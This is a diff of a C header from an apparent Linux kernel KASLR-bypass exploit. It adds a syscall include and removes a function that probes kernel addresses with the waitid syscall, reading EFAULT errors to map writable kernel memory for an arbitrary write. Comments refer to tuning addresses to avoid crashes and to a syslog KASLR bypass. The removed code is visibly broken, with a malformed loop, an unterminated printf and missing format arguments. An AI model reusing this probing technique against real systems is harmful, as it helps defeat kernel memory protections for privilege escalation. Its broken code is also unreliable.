@@ -1,6 +1,7 @@
 #ifndef _kaslr_bypass_h
 #define _kaslr_bypass_h
 #include "./kernel_infos.h"
+#include "syscall.h"
 // where read/write data is in kernel
 // had to play with last 3 nibbles to get it to not crash
 
@@ -24,50 +25,6 @@ unsigned long get_kernel_base() {
   }
   printf("failed to find base address...");
   return -1;
-}
-
-void locate_first_writable() {
-	// first we try doing our arb write to find the system base address
-	// if syscall is 0 we didn't fault
-	
-	unsigned long start = 0xffffffff81000000;
-	unsigned long inc =   0x0000000000000100;
-	unsigned long last =  0xffffffff82522000;
-
-	unsigned long guess = start;
-	size_t count = 0;
-	size_t w_start = 0;
-	size_t w_end = 0;
-	while (guess != 0) {
-		int res = syscall(SYS_waitid, P_ALL, 0, guess, WEXITED, NULL);
-		if (w_start == 0){
-			if(errno != 14){
-				printf("[DBG] Start test in [%p, %p].\n", guess - inc, guess);
-				for(unsigned long s = guess - inc; s++; s <= guess){
-					res = syscall(SYS_waitid, P_ALL, 0, w_start - 1, WEXITED, NULL);
-					if(errno != 14)
-						printf("[DBG] %p - (%p) is writable, so is %p.\n", s);
-					else
-						printf("[DBG] %p - ")
-					
-				}
-
-				w_start = guess;
-				count ++;
-			}
-		}
-		else{
-			if(errno == 14){
-				// guess - inc is the end of the writeable position.
-				printf("[NO.%lu] %p - %p area is writable.\n", count, w_start, (guess - inc));
-				w_start = 0;
-			}
-		}
-		guess += inc;
-		if(guess >= last)
-			break;
-	}
-	return;
 }
 
 /* * * * * * * * * * * * * * syslog KASLR bypass * * * * * * * * * * * * * *
